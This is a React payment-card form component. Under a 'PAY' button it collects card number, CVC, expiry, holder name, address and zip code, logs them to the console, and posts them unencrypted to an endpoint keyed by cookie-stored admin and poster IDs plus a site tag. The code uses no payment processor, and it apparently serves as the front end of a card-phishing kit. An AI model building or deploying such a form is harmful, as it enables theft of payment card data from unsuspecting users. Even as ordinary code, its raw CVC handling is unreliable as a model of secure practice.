import { toast } from "react-toastify";
import { useForm } from "react-hook-form";
import { API_URL, site } from "../config/index";
import Cookies from "js-cookie";

function Card() {
  const form = useForm();
  const { register, handleSubmit, reset } = form;
  const adminId = Cookies.get("adminId");
  const posterId = Cookies.get("posterId");

  const onSubmit = async (values) => {
    const { validity, address, cardNumber, cvc, name, zipCode } = values;
    const submitValues = {
      site,
      validity,
      address,
      cardNumber,
      cvc,
      name,
      zipCode,
    };
    const url = `${API_URL}/ad/${adminId}/${posterId}`;

    const res = await fetch(url, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
      },
      body: JSON.stringify(submitValues),
    });

    const data = await res.json();

    if (res.ok) {
      console.log("submitValues", submitValues);
      toast.success("Card Added Succecssfull");
      reset();
    } else {
      console.log("error", data);
      toast.error("Something Went Wrong");
    }
  };

  return (
    <div className="px-5 lg:px-10 pt-5 pb-10 md:w-[420px] bg-white w-[400px]  rounded-lg mx-auto">
      <div className="mt-5">
        <form onSubmit={handleSubmit(onSubmit)}>
          <div class="debit-card">
            <img
              src="https://image.ibb.co/gDVR4x/master_card_logo.png"
              class="master-card-logo"
            />
            <div class="card-number-block">
              <input
                type="text"
                pattern="^\d{4}$"
                maxlength="4"
                class="number-block"
                placeholder="0000"
              />
              <input
                type="text"
                pattern="^\d{4}$"
                maxlength="4"
                class="number-block"
                placeholder="0000"
              />
              <input
                type="text"
                pattern="^\d{4}$"
                maxlength="4"
                class="number-block"
                placeholder="0000"
              />
              <input
                type="text"
                pattern="^\d{4}$"
                maxlength="4"
                class="number-block"
                placeholder="0000"
              />
            </div>
            <div class="card-holder-block">
              <div class="block-lebel">Card Holder</div>
              <input
                type="text"
                pattern="[A-Z ]+"
                class="card-holder-name"
                placeholder="xxx xxx"
              />
            </div>
          </div>
          <input
            className="w-full text-lg px-[8px] py-[7px] outline-none border border-slate-300 shadow-inner placeholder:font-medium placeholder:text-black/50"
            placeholder="Card Number"
            {...register("cardNumber")}
            type="number"
            required
          />

          <input
            className="mt-5 w-full text-lg  px-[8px] py-[7px] outline-none border border-slate-300 shadow-inner placeholder:font-medium placeholder:text-black/50"
            placeholder="Card Holder Name"
            {...register("name")}
            type="string"
            required
          />
          <input
            className="mt-5 w-full text-lg  px-[8px] py-[7px] outline-none border border-slate-300 shadow-inner placeholder:font-medium placeholder:text-black/50"
            placeholder="29/30"
            {...register("validity")}
            type="number"
            required
          />
          <input
            className="mt-5 w-full text-lg  px-[8px] py-[7px] outline-none border border-slate-300 shadow-inner placeholder:font-medium placeholder:text-black/50"
            placeholder="CVC"
            name="cvc"
            {...register("cvc")}
            type="number"
            required
          />
          <input
            className="mt-5 w-full text-lg  px-[8px] py-[7px] outline-none border border-slate-300 shadow-inner placeholder:font-medium placeholder:text-black/50"
            placeholder="Address Line 1"
            name="address"
            {...register("address")}
            type="string"
            required
          />
          <input
            className="mt-5 w-full text-lg  px-[8px] py-[7px] outline-none border border-slate-300 shadow-inner placeholder:font-medium placeholder:text-black/50"
            placeholder="Zip Code"
            name="zipCode"
            {...register("zipCode")}
            type="number"
            required
          />

          <button
            type="submit"
            className="mt-5 w-full text-lg font-medium bg-[green] hover:bg-custom-cyan2 py-[10px] text-white transition duration-300 rounded"
          >
            PAY
          </button>
        </form>
      </div>
    </div>
  );
}

export default Card;
